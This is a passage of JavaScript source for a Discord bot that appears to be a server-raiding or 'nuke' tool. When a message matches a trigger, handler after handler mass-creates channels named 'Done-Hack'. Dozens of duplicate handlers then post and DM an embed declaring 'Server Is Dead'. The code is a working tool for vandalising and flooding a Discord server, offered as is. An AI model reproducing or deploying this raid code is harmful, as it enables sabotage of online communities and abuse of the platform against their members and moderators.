  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});

//هنا الرسايل تم تهكيرك وكذا

client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
